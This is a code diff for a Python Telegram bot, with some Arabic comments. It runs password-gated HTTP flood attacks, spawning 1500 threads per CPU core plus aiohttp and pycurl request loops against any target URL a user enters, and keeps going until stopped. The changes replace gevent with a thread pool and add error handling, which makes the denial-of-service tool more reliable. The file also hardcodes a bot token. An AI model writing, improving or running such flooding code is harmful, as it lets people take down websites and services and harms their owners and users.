@@ -5,16 +5,11 @@ import multiprocessing
 import requests
 import httpx
 import aiohttp
-import pycurl
 import asyncio
-import gevent
-from gevent import monkey
+import pycurl
 from colorama import Fore, Style
 from concurrent.futures import ThreadPoolExecutor
 from io import BytesIO
-
-# تفعيل التصحيح لخيوط الشبكة في gevent
-monkey.patch_all()
 
 # ضع رمز التوكن الخاص بك هنا
 TOKEN = '7823594166:AAG5HvvfOnliCBVKu9VsnzmCgrQb68m91go'
@@ -36,21 +31,29 @@ def password_prompt(chat_id):
 def check_password(message):
     password = message.text
     if password == "junai":
-        bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu 0x7F6AD9F14371C6FB9678CA77..." + Style.RESET_ALL)
+        bot.send_message(message.chat.id, Fore.GREEN + "Correct password! Opening attack menu..." + Style.RESET_ALL)
         start_attack(message.chat.id)
     else:
         bot.send_message(message.chat.id, Fore.RED + "Wrong password! Exiting..." + Style.RESET_ALL)
 
-def send_requests_gevent(target, stop_flag):
+def send_requests_threaded(target, stop_flag):
+    session = requests.Session()
+    
     def send_request():
         while not stop_flag.value:
             try:
-                requests.get(target, timeout=5)
+                session.get(target, timeout=5)
             except requests.exceptions.RequestException:
                 pass
 
-    jobs = [gevent.spawn(send_request) for _ in range(1500)]
-    gevent.joinall(jobs)
+    num_threads = 1500  # استخدام 1500 خيط كحد أقصى
+
+    with ThreadPoolExecutor(max_workers=num_threads) as executor:
+        futures = [executor.submit(send_request) for _ in range(num_threads)]
+        
+        for future in futures:
+            if stop_flag.value:
+                break
 
 async def send_requests_aiohttp(target, stop_flag):
     async with aiohttp.ClientSession() as session:
@@ -81,21 +84,20 @@ def start_attack(chat_id):
     try:
         msg = bot.send_message(chat_id, "Target URL:")
         bot.register_next_step_handler(msg, get_target_details)
-    except Exception:
-        pass
+    except Exception as e:
+        bot.send_message(chat_id, f"Error: {str(e)}")
 
 def get_target_details(message):
     target = message.text
     msg = bot.send_message(message.chat.id, "Attack will continue indefinitely. Use /stop to end it.")
-    execute_attack(message, target)
+    execute_attack(message.chat.id, target)
 
-def execute_attack(message, target):
+def execute_attack(chat_id, target):
     total_cores = multiprocessing.cpu_count()
 
-    bot.send_message(message.chat.id, f"Starting continuous attack on {target} using {total_cores} cores...")
+    bot.send_message(chat_id, f"Starting continuous attack on {target} using {total_cores} cores...")
 
-    show_attack_animation(message.chat.id)
-    bot.send_message(message.chat.id, "Start Attack")
+    show_attack_animation(chat_id)
 
     processes = []
 
@@ -104,20 +106,23 @@ def execute_attack(message, target):
 
     try:
         for i in range(total_cores):
-            process_gevent = multiprocessing.Process(target=send_requests_gevent, args=(target, stop_attack_flag))
-            process_pycurl = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_flag))
-            processes.extend([process_gevent, process_pycurl])
-            process_gevent.start()
-            process_pycurl.start()
+            process = multiprocessing.Process(target=send_requests_threaded, args=(target, stop_attack_flag))
+            processes.append(process)
+            process.start()
 
-        # تشغيل الجزء غير المتزامن في الخيط الرئيسي
-        asyncio.run(send_requests_aiohttp(target, stop_attack_flag))
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        loop.run_until_complete(send_requests_aiohttp(target, stop_attack_flag))
+
+        pycurl_process = multiprocessing.Process(target=send_requests_pycurl, args=(target, stop_attack_flag))
+        processes.append(pycurl_process)
+        pycurl_process.start()
 
         for process in processes:
             process.join()
 
-    except Exception:
-        pass
+    except Exception as e:
+        bot.send_message(chat_id, f"Error during attack: {str(e)}")
 
 @bot.message_handler(commands=['start'])
 def handle_start(message):
@@ -133,8 +138,8 @@ def handle_stop(message):
 def main():
     try:
         bot.polling(none_stop=True)
-    except Exception:
-        pass
+    except Exception as e:
+        print(f"Bot polling error: {str(e)}")
 
 if __name__ == "__main__":
     main()
